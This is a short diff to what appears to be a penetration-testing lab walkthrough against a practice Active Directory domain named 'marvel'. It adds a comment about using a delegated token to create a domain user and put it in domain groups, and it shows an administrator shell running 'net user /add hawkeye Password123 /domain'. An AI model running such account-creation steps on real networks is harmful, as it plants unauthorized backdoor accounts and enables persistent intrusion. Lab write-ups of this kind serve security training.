@@ -67,6 +67,7 @@ C:\Windows\system32>whoami
 whoami
 marvel\administrator
 
+# use deleteage token to add user in domain and add that domain user in domain groups.
 C:\Windows\system32>net user /add hawkeye Password123 /domain
 net user /add hawkeye Password123 /domain
 
